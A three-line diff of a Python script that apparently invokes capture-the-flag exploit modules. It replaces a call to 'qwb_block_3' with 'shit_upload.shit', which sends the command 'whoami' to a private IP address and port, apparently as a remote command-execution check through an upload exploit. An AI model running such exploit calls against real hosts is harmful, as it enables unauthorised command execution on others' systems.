@@ -1,3 +1,3 @@
-from samples import qwb_block_3
+from samples import shit_upload
 
-qwb_block_3.block('172.16.5.25','5053','whoami')
+shit_upload.shit('172.20.110.101','80','whoami')
